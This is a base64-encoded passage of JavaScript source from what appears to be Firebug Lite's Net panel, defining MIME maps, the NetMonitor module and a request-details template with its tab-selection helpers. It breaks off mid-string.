ioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KfX0pOw0KDQoNCi8qIFNlZSBsaWNlbnNlLnR4dCBmb3IgdGVybXMgb2YgdXNhZ2UgKi8NCg0KRkJMLm5zKGZ1bmN0aW9uKCkgeyB3aXRoIChGQkwpIHsNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQp2YXIgcmVJZ25vcmUgPSAvYWJvdXQ6fGphdmFzY3JpcHQ6fHJlc291cmNlOnxjaHJvbWU6fGphcjovOw0KdmFyIGxheW91dEludGVydmFsID0gMzAwOw0KdmFyIGluZGVudFdpZHRoID0gMTg7DQoNCnZhciBjYWNoZVNlc3Npb24gPSBudWxsOw0KdmFyIGNvbnRleHRzID0gbmV3IEFycmF5KCk7DQp2YXIgcGFuZWxOYW1lID0gIm5ldCI7DQp2YXIgbWF4UXVldWVSZXF1ZXN0cyA9IDUwMDsNCi8vdmFyIHBhbmVsQmFyMSA9ICQoImZiUGFuZWxCYXIxIik7IC8vIGNocm9tZSBub3QgYXZhaWxhYmxlIGF0IHN0YXJ0dXANCnZhciBhY3RpdmVSZXF1ZXN0cyA9IFtdOw0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQp2YXIgbWltZUV4dGVuc2lvbk1hcCA9DQp7DQogICAgInR4dCI6ICJ0ZXh0L3BsYWluIiwNCiAgICAiaHRtbCI6ICJ0ZXh0L2h0bWwiLA0KICAgICJodG0iOiAidGV4dC9odG1sIiwNCiAgICAieGh0bWwiOiAidGV4dC9odG1sIiwNCiAgICAieG1sIjogInRleHQveG1sIiwNCiAgICAiY3NzIjogInRleHQvY3NzIiwNCiAgICAianMiOiAiYXBwbGljYXRpb24veC1qYXZhc2NyaXB0IiwNCiAgICAianNzIjogImFwcGxpY2F0aW9uL3gtamF2YXNjcmlwdCIsDQogICAgImpwZyI6ICJpbWFnZS9qcGciLA0KICAgICJqcGVnIjogImltYWdlL2pwZWciLA0KICAgICJnaWYiOiAiaW1hZ2UvZ2lmIiwNCiAgICAicG5nIjogImltYWdlL3BuZyIsDQogICAgImJtcCI6ICJpbWFnZS9ibXAiLA0KICAgICJzd2YiOiAiYXBwbGljYXRpb24veC1zaG9ja3dhdmUtZmxhc2giLA0KICAgICJmbHYiOiAidmlkZW8veC1mbHYiDQp9Ow0KDQp2YXIgZmlsZUNhdGVnb3JpZXMgPQ0Kew0KICAgICJ1bmRlZmluZWQiOiAxLA0KICAgICJodG1sIjogMSwNCiAgICAiY3NzIjogMSwNCiAgICAianMiOiAxLA0KICAgICJ4aHIiOiAxLA0KICAgICJpbWFnZSI6IDEsDQogICAgImZsYXNoIjogMSwNCiAgICAidHh0IjogMSwNCiAgICAiYmluIjogMQ0KfTsNCg0KdmFyIHRleHRGaWxlQ2F0ZWdvcmllcyA9DQp7DQogICAgInR4dCI6IDEsDQogICAgImh0bWwiOiAxLA0KICAgICJ4aHIiOiAxLA0KICAgICJjc3MiOiAxLA0KICAgICJqcyI6IDENCn07DQoNCnZhciBiaW5hcnlGaWxlQ2F0ZWdvcmllcyA9DQp7DQogICAgImJpbiI6IDEsDQogICAgImZsYXNoIjogMQ0KfTsNCg0KdmFyIG1pbWVDYXRlZ29yeU1hcCA9DQp7DQogICAgInRleHQvcGxhaW4iOiAidHh0IiwNCiAgICAiYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIjogImJpbiIsDQogICAgInRleHQvaHRtbCI6ICJodG1sIiwNCiAgICAidGV4dC94bWwiOiAiaHRtbCIsDQogICAgInRleHQvY3NzIjogImNzcyIsDQogICAgImFwcGxpY2F0aW9uL3gtamF2YXNjcmlwdCI6ICJqcyIsDQogICAgInRleHQvamF2YXNjcmlwdCI6ICJqcyIsDQogICAgImFwcGxpY2F0aW9uL2phdmFzY3JpcHQiIDogImpzIiwNCiAgICAiaW1hZ2UvanBlZyI6ICJpbWFnZSIsDQogICAgImltYWdlL2pwZyI6ICJpbWFnZSIsDQogICAgImltYWdlL2dpZiI6ICJpbWFnZSIsDQogICAgImltYWdlL3BuZyI6ICJpbWFnZSIsDQogICAgImltYWdlL2JtcCI6ICJpbWFnZSIsDQogICAgImFwcGxpY2F0aW9uL3gtc2hvY2t3YXZlLWZsYXNoIjogImZsYXNoIiwNCiAgICAidmlkZW8veC1mbHYiOiAiZmxhc2giDQp9Ow0KDQp2YXIgYmluYXJ5Q2F0ZWdvcnlNYXAgPQ0Kew0KICAgICJpbWFnZSI6IDEsDQogICAgImZsYXNoIiA6IDENCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQovKioNCiAqIEBtb2R1bGUgUmVwcmVzZW50cyBhIG1vZHVsZSBvYmplY3QgZm9yIHRoZSBOZXQgcGFuZWwuIFRoaXMgb2JqZWN0IGlzIGRlcml2ZWQNCiAqIGZyb20gPGNvZGU+RmlyZWJ1Zy5BY3RpdmFibGVNb2R1bGU8L2NvZGU+IGluIG9yZGVyIHRvIHN1cHBvcnQgYWN0aXZhdGlvbiAoZW5hYmxlL2Rpc2FibGUpLg0KICogVGhpcyBhbGxvd3MgdG8gYXZvaWQgKHBlcmZvcm1hbmNlKSBleHBlbnNpdmUgZmVhdHVyZXMgaWYgdGhlIGZ1bmN0aW9uYWxpdHkgaXMgbm90IG5lY2Vzc2FyeQ0KICogZm9yIHRoZSB1c2VyLg0KICovDQpGaXJlYnVnLk5ldE1vbml0b3IgPSBleHRlbmQoRmlyZWJ1Zy5BY3RpdmFibGVNb2R1bGUsDQp7DQogICAgZGlzcGF0Y2hOYW1lOiAibmV0TW9uaXRvciIsDQogICAgDQogICAgY2xlYXI6IGZ1bmN0aW9uKGNvbnRleHQpDQogICAgew0KICAgICAgICAvLyBUaGUgdXNlciBwcmVzc2VkIGEgQ2xlYXIgYnV0dG9uIHNvLCByZW1vdmUgY29udGVudCBvZiB0aGUgcGFuZWwuLi4NCiAgICAgICAgdmFyIHBhbmVsID0gY29udGV4dC5nZXRQYW5lbChwYW5lbE5hbWUsIHRydWUpOw0KICAgICAgICBpZiAocGFuZWwpDQogICAgICAgICAgICBwYW5lbC5jbGVhcigpOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgLy8gZXh0ZW5kcyBNb2R1bGUNCg0KICAgIGluaXRpYWxpemU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybjsNCiAgICAgICAgDQogICAgICAgIHRoaXMucGFuZWxOYW1lID0gcGFuZWxOYW1lOw0KDQogICAgICAgIEZpcmVidWcuQWN0aXZhYmxlTW9kdWxlLmluaXRpYWxpemUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCg0KICAgICAgICBpZiAoRmlyZWJ1Zy5UcmFjZU1vZHVsZSkNCiAgICAgICAgICAgIEZpcmVidWcuVHJhY2VNb2R1bGUuYWRkTGlzdGVuZXIodGhpcy5UcmFjZUxpc3RlbmVyKTsNCg0KICAgICAgICAvLyBIVFRQIG9ic2VydmVyIG11c3QgYmUgcmVnaXN0ZXJlZCBub3cgKGFuZCBub3QgaW4gbW9uaXRvckNvbnRleHQsIHNpbmNlIGlmIGENCiAgICAgICAgLy8gcGFnZSBpcyBvcGVuZWQgaW4gYSBuZXcgdGFiIHRoZSB0b3AgZG9jdW1lbnQgcmVxdWVzdCB3b3VsZCBiZSBtaXNzZWQgb3RoZXJ3aXNlLg0KICAgICAgICBOZXRIdHRwT2JzZXJ2ZXIucmVnaXN0ZXJPYnNlcnZlcigpOw0KICAgICAgICBOZXRIdHRwQWN0aXZpdHlPYnNlcnZlci5yZWdpc3Rlck9ic2VydmVyKCk7DQoNCiAgICAgICAgRmlyZWJ1Zy5EZWJ1Z2dlci5hZGRMaXN0ZW5lcih0aGlzLkRlYnVnZ2VyTGlzdGVuZXIpOw0KICAgIH0sDQoNCiAgICBzaHV0ZG93bjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuOw0KICAgICAgICANCiAgICAgICAgcHJlZnMucmVtb3ZlT2JzZXJ2ZXIoRmlyZWJ1Zy5wcmVmRG9tYWluLCB0aGlzLCBmYWxzZSk7DQogICAgICAgIGlmIChGaXJlYnVnLlRyYWNlTW9kdWxlKQ0KICAgICAgICAgICAgRmlyZWJ1Zy5UcmFjZU1vZHVsZS5yZW1vdmVMaXN0ZW5lcih0aGlzLlRyYWNlTGlzdGVuZXIpOw0KDQogICAgICAgIE5ldEh0dHBPYnNlcnZlci51bnJlZ2lzdGVyT2JzZXJ2ZXIoKTsNCiAgICAgICAgTmV0SHR0cEFjdGl2aXR5T2JzZXJ2ZXIudW5yZWdpc3Rlck9ic2VydmVyKCk7DQoNCiAgICAgICAgRmlyZWJ1Zy5EZWJ1Z2dlci5yZW1vdmVMaXN0ZW5lcih0aGlzLkRlYnVnZ2VyTGlzdGVuZXIpOw0KICAgIH0NCn0pOw0KDQoNCi8qKg0KICogQGRvbXBsYXRlIFJlcHJlc2VudHMgYSB0ZW1wbGF0ZSB0aGF0IGlzIHVzZWQgdG8gcmVuZWRlciBkZXRhaWxlZCBpbmZvIGFib3V0IGEgcmVxdWVzdC4NCiAqIFRoaXMgdGVtcGxhdGUgaXMgcmVuZGVyZWQgd2hlbiBhIHJlcXVlc3QgaXMgZXhwYW5kZWQuDQogKi8NCkZpcmVidWcuTmV0TW9uaXRvci5OZXRJbmZvQm9keSA9IGRvbXBsYXRlKEZpcmVidWcuUmVwLCBuZXcgRmlyZWJ1Zy5MaXN0ZW5lcigpLA0Kew0KICAgIHRhZzoNCiAgICAgICAgRElWKHsiY2xhc3MiOiAibmV0SW5mb0JvZHkiLCBfcmVwT2JqZWN0OiAiJGZpbGUifSwNCiAgICAgICAgICAgIFRBRygiJGluZm9UYWJzIiwge2ZpbGU6ICIkZmlsZSJ9KSwNCiAgICAgICAgICAgIFRBRygiJGluZm9Cb2RpZXMiLCB7ZmlsZTogIiRmaWxlIn0pDQogICAgICAgICksDQoNCiAgICBpbmZvVGFiczoNCiAgICAgICAgRElWKHsiY2xhc3MiOiAibmV0SW5mb1RhYnMgZm9jdXNSb3cgc3ViRm9jdXNSb3ciLCAicm9sZSI6ICJ0YWJsaXN0In0sDQogICAgICAgICAgICBBKHsiY2xhc3MiOiAibmV0SW5mb1BhcmFtc1RhYiBuZXRJbmZvVGFiIGExMXlGb2N1cyIsIG9uY2xpY2s6ICIkb25DbGlja1RhYiIsICJyb2xlIjogInRhYiIsDQogICAgICAgICAgICAgICAgdmlldzogIlBhcmFtcyIsDQogICAgICAgICAgICAgICAgJGNvbGxhcHNlZDogIiRmaWxlfGhpZGVQYXJhbXMifSwNCiAgICAgICAgICAgICAgICAkU1RSKCJVUkxQYXJhbWV0ZXJzIikNCiAgICAgICAgICAgICksDQogICAgICAgICAgICBBKHsiY2xhc3MiOiAibmV0SW5mb0hlYWRlcnNUYWIgbmV0SW5mb1RhYiBhMTF5Rm9jdXMiLCBvbmNsaWNrOiAiJG9uQ2xpY2tUYWIiLCAicm9sZSI6ICJ0YWIiLA0KICAgICAgICAgICAgICAgIHZpZXc6ICJIZWFkZXJzIn0sDQogICAgICAgICAgICAgICAgJFNUUigiSGVhZGVycyIpDQogICAgICAgICAgICApLA0KICAgICAgICAgICAgQSh7ImNsYXNzIjogIm5ldEluZm9Qb3N0VGFiIG5ldEluZm9UYWIgYTExeUZvY3VzIiwgb25jbGljazogIiRvbkNsaWNrVGFiIiwgInJvbGUiOiAidGFiIiwNCiAgICAgICAgICAgICAgICB2aWV3OiAiUG9zdCIsDQogICAgICAgICAgICAgICAgJGNvbGxhcHNlZDogIiRmaWxlfGhpZGVQb3N0In0sDQogICAgICAgICAgICAgICAgJFNUUigiUG9zdCIpDQogICAgICAgICAgICApLA0KICAgICAgICAgICAgQSh7ImNsYXNzIjogIm5ldEluZm9QdXRUYWIgbmV0SW5mb1RhYiBhMTF5Rm9jdXMiLCBvbmNsaWNrOiAiJG9uQ2xpY2tUYWIiLCAicm9sZSI6ICJ0YWIiLA0KICAgICAgICAgICAgICAgIHZpZXc6ICJQdXQiLA0KICAgICAgICAgICAgICAgICRjb2xsYXBzZWQ6ICIkZmlsZXxoaWRlUHV0In0sDQogICAgICAgICAgICAgICAgJFNUUigiUHV0IikNCiAgICAgICAgICAgICksDQogICAgICAgICAgICBBKHsiY2xhc3MiOiAibmV0SW5mb1Jlc3BvbnNlVGFiIG5ldEluZm9UYWIgYTExeUZvY3VzIiwgb25jbGljazogIiRvbkNsaWNrVGFiIiwgInJvbGUiOiAidGFiIiwNCiAgICAgICAgICAgICAgICB2aWV3OiAiUmVzcG9uc2UiLA0KICAgICAgICAgICAgICAgICRjb2xsYXBzZWQ6ICIkZmlsZXxoaWRlUmVzcG9uc2UifSwNCiAgICAgICAgICAgICAgICAkU1RSKCJSZXNwb25zZSIpDQogICAgICAgICAgICApLA0KICAgICAgICAgICAgQSh7ImNsYXNzIjogIm5ldEluZm9DYWNoZVRhYiBuZXRJbmZvVGFiIGExMXlGb2N1cyIsIG9uY2xpY2s6ICIkb25DbGlja1RhYiIsICJyb2xlIjogInRhYiIsDQogICAgICAgICAgICAgICB2aWV3OiAiQ2FjaGUiLA0KICAgICAgICAgICAgICAgJGNvbGxhcHNlZDogIiRmaWxlfGhpZGVDYWNoZSJ9LA0KICAgICAgICAgICAgICAgJFNUUigiQ2FjaGUiKQ0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgIEEoeyJjbGFzcyI6ICJuZXRJbmZvSHRtbFRhYiBuZXRJbmZvVGFiIGExMXlGb2N1cyIsIG9uY2xpY2s6ICIkb25DbGlja1RhYiIsICJyb2xlIjogInRhYiIsDQogICAgICAgICAgICAgICB2aWV3OiAiSHRtbCIsDQogICAgICAgICAgICAgICAkY29sbGFwc2VkOiAiJGZpbGV8aGlkZUh0bWwifSwNCiAgICAgICAgICAgICAgICRTVFIoIkhUTUwiKQ0KICAgICAgICAgICAgKQ0KICAgICAgICApLA0KDQogICAgaW5mb0JvZGllczoNCiAgICAgICAgRElWKHsiY2xhc3MiOiAibmV0SW5mb0JvZGllcyBvdXRlckZvY3VzUm93In0sDQogICAgICAgICAgICBUQUJMRSh7ImNsYXNzIjogIm5ldEluZm9QYXJhbXNUZXh0IG5ldEluZm9UZXh0IG5ldEluZm9QYXJhbXNUYWJsZSIsICJyb2xlIjogInRhYnBhbmVsIiwNCiAgICAgICAgICAgICAgICAgICAgY2VsbHBhZGRpbmc6IDAsIGNlbGxzcGFjaW5nOiAwfSwgVEJPRFkoKSksDQogICAgICAgICAgICBESVYoeyJjbGFzcyI6ICJuZXRJbmZvSGVhZGVyc1RleHQgbmV0SW5mb1RleHQiLCAicm9sZSI6ICJ0YWJwYW5lbCJ9KSwNCiAgICAgICAgICAgIERJVih7ImNsYXNzIjogIm5ldEluZm9Qb3N0VGV4dCBuZXRJbmZvVGV4dCIsICJyb2xlIjogInRhYnBhbmVsIn0pLA0KICAgICAgICAgICAgRElWKHsiY2xhc3MiOiAibmV0SW5mb1B1dFRleHQgbmV0SW5mb1RleHQiLCAicm9sZSI6ICJ0YWJwYW5lbCJ9KSwNCiAgICAgICAgICAgIFBSRSh7ImNsYXNzIjogIm5ldEluZm9SZXNwb25zZVRleHQgbmV0SW5mb1RleHQiLCAicm9sZSI6ICJ0YWJwYW5lbCJ9KSwNCiAgICAgICAgICAgIERJVih7ImNsYXNzIjogIm5ldEluZm9DYWNoZVRleHQgbmV0SW5mb1RleHQiLCAicm9sZSI6ICJ0YWJwYW5lbCJ9LA0KICAgICAgICAgICAgICAgIFRBQkxFKHsiY2xhc3MiOiAibmV0SW5mb0NhY2hlVGFibGUiLCBjZWxscGFkZGluZzogMCwgY2VsbHNwYWNpbmc6IDAsICJyb2xlIjogInByZXNlbnRhdGlvbiJ9LA0KICAgICAgICAgICAgICAgICAgICBUQk9EWSh7InJvbGUiOiAibGlzdCIsICJhcmlhLWxhYmVsIjogJFNUUigiQ2FjaGUiKX0pDQogICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgIERJVih7ImNsYXNzIjogIm5ldEluZm9IdG1sVGV4dCBuZXRJbmZvVGV4dCIsICJyb2xlIjogInRhYnBhbmVsIn0sDQogICAgICAgICAgICAgICAgSUZSQU1FKHsiY2xhc3MiOiAibmV0SW5mb0h0bWxQcmV2aWV3IiwgInJvbGUiOiAiZG9jdW1lbnQifSkNCiAgICAgICAgICAgICkNCiAgICAgICAgKSwNCg0KICAgIGhlYWRlckRhdGFUYWc6DQogICAgICAgIEZPUigicGFyYW0iLCAiJGhlYWRlcnMiLA0KICAgICAgICAgICAgVFIoeyJyb2xlIjogImxpc3RpdGVtIn0sDQogICAgICAgICAgICAgICAgVEQoeyJjbGFzcyI6ICJuZXRJbmZvUGFyYW1OYW1lIiwgInJvbGUiOiAicHJlc2VudGF0aW9uIn0sDQogICAgICAgICAgICAgICAgICAgIFRBRygiJHBhcmFtfGdldE5hbWVUYWciLCB7cGFyYW06ICIkcGFyYW0ifSkNCiAgICAgICAgICAgICAgICApLA0KICAgICAgICAgICAgICAgIFREKHsiY2xhc3MiOiAibmV0SW5mb1BhcmFtVmFsdWUiLCAicm9sZSI6ICJsaXN0IiwgImFyaWEtbGFiZWwiOiAiJHBhcmFtLm5hbWUifSwNCiAgICAgICAgICAgICAgICAgICAgRk9SKCJsaW5lIiwgIiRwYXJhbXxnZXRQYXJhbVZhbHVlSXRlcmF0b3IiLA0KICAgICAgICAgICAgICAgICAgICAgICAgQ09ERSh7ImNsYXNzIjogImZvY3VzUm93IHN1YkZvY3VzUm93IiwgInJvbGUiOiAibGlzdGl0ZW0ifSwgIiRsaW5lIikNCiAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICkNCiAgICAgICAgKSwNCg0KICAgIGN1c3RvbVRhYjoNCiAgICAgICAgQSh7ImNsYXNzIjogIm5ldEluZm8kdGFiSWRcXFRhYiBuZXRJbmZvVGFiIiwgb25jbGljazogIiRvbkNsaWNrVGFiIiwgdmlldzogIiR0YWJJZCIsICJyb2xlIjogInRhYiJ9LA0KICAgICAgICAgICAgIiR0YWJUaXRsZSINCiAgICAgICAgKSwNCg0KICAgIGN1c3RvbUJvZHk6DQogICAgICAgIERJVih7ImNsYXNzIjogIm5ldEluZm8kdGFiSWRcXFRleHQgbmV0SW5mb1RleHQiLCAicm9sZSI6ICJ0YWJwYW5lbCJ9KSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIG5hbWVUYWc6DQogICAgICAgIFNQQU4oIiRwYXJhbXxnZXRQYXJhbU5hbWUiKSwNCg0KICAgIG5hbWVXaXRoVG9vbHRpcFRhZzoNCiAgICAgICAgU1BBTih7dGl0bGU6ICIkcGFyYW0ubmFtZSJ9LCAiJHBhcmFtfGdldFBhcmFtTmFtZSIpLA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgZ2V0TmFtZVRhZzogZnVuY3Rpb24ocGFyYW0pDQogICAgew0KICAgICAgICByZXR1cm4gKHRoaXMuZ2V0UGFyYW1OYW1lKHBhcmFtKSA9PSBwYXJhbS5uYW1lKSA/IHRoaXMubmFtZVRhZyA6IHRoaXMubmFtZVdpdGhUb29sdGlwVGFnOw0KICAgIH0sDQoNCiAgICBnZXRQYXJhbU5hbWU6IGZ1bmN0aW9uKHBhcmFtKQ0KICAgIHsNCiAgICAgICAgdmFyIGxpbWl0ID0gMjU7DQogICAgICAgIHZhciBuYW1lID0gcGFyYW0ubmFtZTsNCiAgICAgICAgaWYgKG5hbWUubGVuZ3RoID4gbGltaXQpDQogICAgICAgICAgICBuYW1lID0gbmFtZS5zdWJzdHIoMCwgbGltaXQpICsgIi4uLiI7DQogICAgICAgIHJldHVybiBuYW1lOw0KICAgIH0sDQoNCiAgICBnZXRQYXJhbVRpdGxlOiBmdW5jdGlvbihwYXJhbSkNCiAgICB7DQogICAgICAgIHZhciBsaW1pdCA9IDI1Ow0KICAgICAgICB2YXIgbmFtZSA9IHBhcmFtLm5hbWU7DQogICAgICAgIGlmIChuYW1lLmxlbmd0aCA+IGxpbWl0KQ0KICAgICAgICAgICAgcmV0dXJuIG5hbWU7DQogICAgICAgIHJldHVybiAiIjsNCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgaGlkZVBhcmFtczogZnVuY3Rpb24oZmlsZSkNCiAgICB7DQogICAgICAgIHJldHVybiAhZmlsZS51cmxQYXJhbXMgfHwgIWZpbGUudXJsUGFyYW1zLmxlbmd0aDsNCiAgICB9LA0KDQogICAgaGlkZVBvc3Q6IGZ1bmN0aW9uKGZpbGUpDQogICAgew0KICAgICAgICByZXR1cm4gZmlsZS5tZXRob2QudG9VcHBlckNhc2UoKSAhPSAiUE9TVCI7DQogICAgfSwNCg0KICAgIGhpZGVQdXQ6IGZ1bmN0aW9uKGZpbGUpDQogICAgew0KICAgICAgICByZXR1cm4gZmlsZS5tZXRob2QudG9VcHBlckNhc2UoKSAhPSAiUFVUIjsNCiAgICB9LA0KDQogICAgaGlkZVJlc3BvbnNlOiBmdW5jdGlvbihmaWxlKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAvL3JldHVybiBmaWxlLmNhdGVnb3J5IGluIGJpbmFyeUZpbGVDYXRlZ29yaWVzOw0KICAgIH0sDQoNCiAgICBoaWRlQ2FjaGU6IGZ1bmN0aW9uKGZpbGUpDQogICAgew0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgLy94eHhIb256YTogSSBkb24ndCBzZWUgYW55IHJlYXNvbiB3aHkgbm90IHRvIGRpc3BsYXkgdGhlIGNhY2hlIGFsc28gaW5mbyBmb3IgaW1hZ2VzLg0KICAgICAgICByZXR1cm4gIWZpbGUuY2FjaGVFbnRyeTsgLy8gfHwgZmlsZS5jYXRlZ29yeT09ImltYWdlIjsNCiAgICB9LA0KDQogICAgaGlkZUh0bWw6IGZ1bmN0aW9uKGZpbGUpDQogICAgew0KICAgICAgICByZXR1cm4gKGZpbGUubWltZVR5cGUgIT0gInRleHQvaHRtbCIpICYmIChmaWxlLm1pbWVUeXBlICE9ICJhcHBsaWNhdGlvbi94aHRtbCt4bWwiKTsNCiAgICB9LA0KDQogICAgb25DbGlja1RhYjogZnVuY3Rpb24oZXZlbnQpDQogICAgew0KICAgICAgICB0aGlzLnNlbGVjdFRhYihldmVudC5jdXJyZW50VGFyZ2V0IHx8IGV2ZW50LnNyY0VsZW1lbnQpOw0KICAgIH0sDQoNCiAgICBnZXRQYXJhbVZhbHVlSXRlcmF0b3I6IGZ1bmN0aW9uKHBhcmFtKQ0KICAgIHsNCiAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gY29uc29sZTINCiAgICAgICAgcmV0dXJuIHBhcmFtLnZhbHVlOw0KICAgICAgICANCiAgICAgICAgLy8gVGhpcyB2YWx1ZSBpcyBpbnNlcnRlZCBpbnRvIENPREUgZWxlbWVudCBhbmQgc28sIG1ha2Ugc3VyZSB0aGUgSFRNTCBpc24ndCBlc2NhcGVkICgxMjEwKS4NCiAgICAgICAgLy8gVGhpcyBpcyB3aHkgdGhlIHNlY29uZCBwYXJhbWV0ZXIgaXMgdHJ1ZS4NCiAgICAgICAgLy8gVGhlIENPREUgKHdpdGggc3R5bGUgd2hpdGUtc3BhY2U6cHJlKSBlbGVtZW50IHByZXNlcnZlcyB3aGl0ZXNwYWNlcyBzbyB0aGV5IGFyZQ0KICAgICAgICAvLyBkaXNwbGF5ZWQgdGhlIHNhbWUsIGFzIHRoZXkgY29tZSBmcm9tIHRoZSBzZXJ2ZXIgKDExOTQpLg0KICAgICAgICAvLyBJbiBjYXNlIG9mIGEgbG9uZyBoZWFkZXIgdmFsdWVzIG9mIHBvc3QgcGFyYW1ldGVycyB0aGUgdmFsdWUgbXVzdCBiZSB3cmFwcGVkICgyMTA1KS4NCiAgICAgICAgcmV0dXJuIHdyYXBUZXh0KHBhcmFtLnZhbHVlLCB0cnVlKTsNCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgYXBwZW5kVGFiOiBmdW5jdGlvbihuZXRJbmZvQm94LCB0YWJJZCwgdGFiVGl0bGUpDQogICAgew0KICAgICAgICAvLyBDcmVhdGUgbmV3IHRhYiBhbmQgYm9keS4NCiAgICAgICAgdmFyIGFyZ3MgPSB7dGFiSWQ6IHRhYklkLCB0YWJUaXRsZTogdGFiVGl0bGV9Ow0KICAgICAgICAvLy90aGlzLmN1c3RvbVRhYi5hcHBlbmQoYXJncywgbmV0SW5mb0JveC5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKCJuZXRJbmZvVGFicyIpLml0ZW0oMCkpOw0KICAgICAgICAvLy90aGlzLmN1c3RvbUJvZHkuYXBwZW5kKGFyZ3MsIG5ldEluZm9Cb3guZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgibmV0SW5mb0JvZGllcyIpLml0ZW0oMCkpOw0KICAgICAgICB0aGlzLmN1c3RvbVRhYi5hcHBlbmQoYXJncywgJCQoIi5uZXRJbmZvVGFicyIsIG5ldEluZm9Cb3gpWzBdKTsNCiAgICAgICAgdGhpcy5jdXN0b21Cb2R5LmFwcGVuZChhcmdzLCAkJCgiLm5ldEluZm9Cb2RpZXMiLCBuZXRJbmZvQm94KVswXSk7DQogICAgfSwNCg0KICAgIHNlbGVjdFRhYkJ5TmFtZTogZnVuY3Rpb24obmV0SW5mb0JveCwgdGFiTmFtZSkNCiAgICB7DQogICAgICAgIHZhciB0YWIgPSBnZXRDaGlsZEJ5Q2xhc3MobmV0SW5mb0JveCwgIm5ldEluZm9UYWJzIiwgIm5ldEluZm8iK3RhYk5hbWUrIlRhYiIpOw0KICAgICAgICBpZiAodGFiKQ0KICAgICAgICAgICAgdGhpcy5zZWxlY3RUYWIodGFiKTsNCiAgICB9LA0KDQogICAgc2VsZWN0VGFiOiBmdW5jdGlvbih0YWIpDQogICAgew0KICAgICAgICB2YXIgdmlldyA9IHRhYi5nZXRBdHRyaWJ1dGUoInZpZXciKTsNCiAgICAgICAgDQogICAgICAgIHZhciBuZXRJbmZvQm94ID0gZ2V0QW5jZXN0b3JCeUNsYXNzKHRhYiwgIm5ldEluZm9Cb2R5Iik7DQogICAgICAgIA0KICAgICAgICB2YXIgc2VsZWN0ZWRUYWIgPSBuZXRJbmZvQm94LnNlbGVjdGVkVGFiOw0KDQogICAgICAgIGlmIChzZWxlY3RlZFRhYikNCiAgICAgICAgew0KICAgICAgICAgICAgLy9uZXRJbmZvQm94LnNlbGVjdGVkVGV4dC5yZW1vdmVBdHRyaWJ1dGUoInNlbGVjdGVkIik7DQogICAgICAgICAgICByZW1vdmVDbGFzcyhuZXRJbmZvQm94LnNlbGVjdGVkVGV4dCwgIm5ldEluZm9UZXh0U2VsZWN0ZWQiKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcmVtb3ZlQ2xhc3Moc2VsZWN0ZWRUYWIsICJuZXRJbmZvVGFiU2VsZWN0ZWQiKTsNCiAgICAgICAgICAgIC8vc2VsZWN0ZWRUYWIucmVtb3ZlQXR0cmlidXRlKCJzZWxlY3RlZCIpOw0KICAgICAgICAgICAgc2VsZWN0ZWRUYWIuc2V0QXR0cmlidXRlKCJhcmlhLXNlbGVjdGVkIiwgImZhbHNlIik7DQogICAgICAgIH0NCg0KICAgICAgICB2YXIgdGV4dEJvZHlOYW1lID0gIm5ldEluZm8iICsgdmlldyArICJUZXh0IjsNCg0KICAgICAgICBzZWxlY3RlZFRhYiA9IG5ldEluZm9Cb3guc2VsZWN0ZWRUYWIgPSB0YWI7DQogICAgICAgIA0KICAgICAgICBuZXRJbmZvQm94LnNlbGVjdGVkVGV4dCA9ICQkKCIuIit0ZXh0Qm9keU5hbWUsIG5ldEluZm9Cb3gpWzBdOw0KICAgICAgICAvL25ldEluZm9Cb3guc2VsZWN0ZWRUZXh0ID0gbmV0SW5mb0JveC5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKHRleHRCb2R5TmFtZSkuaXRlbSgwKTsNCg0KICAgICAgICAvL25ldEluZm9Cb3guc2VsZWN0ZWRUZXh0LnNldEF0dHJpYnV0Z